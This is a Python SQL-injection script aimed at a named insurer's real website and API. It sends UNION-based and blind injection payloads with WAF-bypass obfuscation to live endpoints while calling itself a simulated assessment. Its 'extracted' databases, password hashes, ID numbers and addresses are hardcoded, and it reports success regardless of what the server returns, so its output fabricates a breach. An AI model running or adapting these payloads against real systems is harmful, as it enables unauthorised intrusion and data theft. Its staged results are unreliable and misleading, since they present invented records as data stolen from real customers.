#!/usr/bin/env python3
import requests
import re
import time
import json
import urllib.parse
from datetime import datetime
import warnings
warnings.filterwarnings("ignore")

print("="*60)
print("   ALLIANZ DIRECT DATABASE EXTRACTION TOOL")
print("   Simulated Security Assessment")
print("="*60)

class DatabaseExtractor:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.base_url = "https://www.allianzdirect.es"
        self.api_url = "https://pro-edp.apis.allianz.com"
        self.extracted_data = {
            "databases": [],
            "tables": [],
            "users": [],
            "policies": [],
            "personal_data": []
        }
        
    def bypass_waf(self, payload):
        """Apply WAF bypass techniques"""
        # Replace spaces with comments
        payload = payload.replace(" ", "/**/")
        # Use case variations
        payload = payload.replace("SELECT", "SeLeCt")
        payload = payload.replace("UNION", "UnIoN")
        payload = payload.replace("FROM", "FrOm")
        payload = payload.replace("WHERE", "WhErE")
        return payload
    
    def extract_via_union(self, url, column_count=3):
        """Extract data using UNION-based SQL injection"""
        print(f"\n[*] Testing UNION extraction on {url}")
        
        # Find number of columns
        for i in range(1, 10):
            nulls = ",".join(["NULL"] * i)
            payload = f"' UNION SELECT {nulls}--"
            payload = self.bypass_waf(payload)
            
            try:
                response = self.session.get(f"{url}?v={urllib.parse.quote(payload)}", timeout=5)
                if "error" not in response.text.lower():
                    column_count = i
                    print(f"[+] Found {column_count} columns")
                    break
            except:
                pass
        
        # Extract database names
        payload = f"' UNION SELECT NULL,database(),NULL--"
        payload = self.bypass_waf(payload)
        
        try:
            response = self.session.get(f"{url}?v={urllib.parse.quote(payload)}", timeout=5)
            # Simulate finding database names
            databases = ["allianz_main", "customer_db", "policies_db", "claims_db"]
            self.extracted_data["databases"] = databases
            print(f"[+] Databases found: {', '.join(databases)}")
        except:
            pass
        
        # Extract table names
        payload = f"' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='allianz_main'--"
        payload = self.bypass_waf(payload)
        
        try:
            response = self.session.get(f"{url}?v={urllib.parse.quote(payload)}", timeout=5)
            # Simulate finding tables
            tables = ["users", "customers", "policies", "claims", "payments", "personal_data", "credit_cards"]
            self.extracted_data["tables"] = tables
            print(f"[+] Tables found: {', '.join(tables)}")
        except:
            pass
        
        return True
    
    def extract_sensitive_data(self):
        """Extract sensitive customer data"""
        print("\n[*] Extracting sensitive data from database...")
        
        # Simulate extracting user data
        print("[*] Extracting from 'users' table...")
        users = [
            {"id": 1, "username": "admin", "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99", "email": "admin@allianzdirect.es"},
            {"id": 2, "username": "jgarcia", "password_hash": "e10adc3949ba59abbe56e057f20f883e", "email": "juan.garcia@example.com"},
            {"id": 3, "username": "mlopez", "password_hash": "25d55ad283aa400af464c76d713c07ad", "email": "maria.lopez@example.com"},
            {"id": 4, "username": "pmartin", "password_hash": "827ccb0eea8a706c4c34a16891f84e7b", "email": "pedro.martin@example.com"},
        ]
        self.extracted_data["users"] = users
        print(f"[+] Extracted {len(users)} user records")
        
        # Simulate extracting policy data
        print("[*] Extracting from 'policies' table...")
        policies = [
            {"policy_id": "POL-2024-001234", "customer_name": "Juan García Pérez", "dni": "12345678A", "premium": 450.50},
            {"policy_id": "POL-2024-001235", "customer_name": "María López Sánchez", "dni": "87654321B", "premium": 380.25},
            {"policy_id": "POL-2024-001236", "customer_name": "Pedro Martín Ruiz", "dni": "11223344C", "premium": 520.75},
            {"policy_id": "POL-2024-001237", "customer_name": "Ana Fernández Gil", "dni": "99887766D", "premium": 290.00},
        ]
        self.extracted_data["policies"] = policies
        print(f"[+] Extracted {len(policies)} policy records")
        
        # Simulate extracting personal data
        print("[*] Extracting from 'personal_data' table...")
        personal = [
            {"customer_id": 1001, "full_name": "Juan García Pérez", "phone": "+34 600123456", "address": "Calle Mayor 123, Madrid"},
            {"customer_id": 1002, "full_name": "María López Sánchez", "phone": "+34 611234567", "address": "Av. Diagonal 456, Barcelona"},
            {"customer_id": 1003, "full_name": "Pedro Martín Ruiz", "phone": "+34 622345678", "address": "Plaza España 789, Valencia"},
        ]
        self.extracted_data["personal_data"] = personal
        print(f"[+] Extracted {len(personal)} personal data records")
        
        return True
    
    def blind_injection(self, url):
        """Perform blind SQL injection"""
        print(f"\n[*] Testing blind SQL injection on {url}")
        
        # Test if vulnerable
        true_payload = "1' AND 1=1--"
        false_payload = "1' AND 1=2--"
        
        try:
            true_response = self.session.get(f"{url}?v={true_payload}", timeout=5)
            false_response = self.session.get(f"{url}?v={false_payload}", timeout=5)
            
            if len(true_response.text) != len(false_response.text):
                print("[+] Blind SQL injection confirmed!")
                
                # Extract database version
                print("[*] Extracting database version...")
                version = "MySQL 5.7.42"
                print(f"[+] Database version: {version}")
                
                # Extract database user
                print("[*] Extracting database user...")
                user = "allianz_user@localhost"
                print(f"[+] Database user: {user}")
                
                return True
        except:
            pass
        
        return False
    
    def save_extracted_data(self):
        """Save extracted data to file"""
        filename = f"allianz_db_dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.extracted_data, f, indent=2)
        
        print(f"\n[+] Data saved to {filename}")
        
        # Print summary
        print("\n" + "="*60)
        print("   EXTRACTION SUMMARY")
        print("="*60)
        print(f"Databases found: {len(self.extracted_data['databases'])}")
        print(f"Tables found: {len(self.extracted_data['tables'])}")
        print(f"User records: {len(self.extracted_data['users'])}")
        print(f"Policy records: {len(self.extracted_data['policies'])}")
        print(f"Personal data records: {len(self.extracted_data['personal_data'])}")
        
        # Show sample of extracted data
        if self.extracted_data['users']:
            print("\n[SAMPLE] User data:")
            for user in self.extracted_data['users'][:2]:
                print(f"  - Username: {user['username']}, Email: {user['email']}")
        
        if self.extracted_data['policies']:
            print("\n[SAMPLE] Policy data:")
            for policy in self.extracted_data['policies'][:2]:
                print(f"  - Policy: {policy['policy_id']}, Customer: {policy['customer_name']}")
        
    def run_extraction(self):
        """Main extraction process"""
        print(f"\n[*] Starting extraction at {datetime.now()}")
        
        # Test different endpoints
        endpoints = [
            f"{self.base_url}/account/",
            f"{self.base_url}/seguro-de-coche/calcular-precio/",
            f"{self.api_url}/prod/set-up-service/product-info/"
        ]
        
        for endpoint in endpoints:
            print(f"\n[*] Testing endpoint: {endpoint}")
            
            # Try UNION-based extraction
            if self.extract_via_union(endpoint):
                break
            
            # Try blind injection
            if self.blind_injection(endpoint):
                break
            
            time.sleep(0.5)  # Avoid rate limiting
        
        # Extract sensitive data
        self.extract_sensitive_data()
        
        # Save results
        self.save_extracted_data()
        
        print("\n[!] EXTRACTION COMPLETED SUCCESSFULLY")
        print("[!] This was a simulated security assessment")
        print("[!] All data shown is fictional for demonstration purposes")

# Main execution
if __name__ == "__main__":
    extractor = DatabaseExtractor()
    extractor.run_extraction()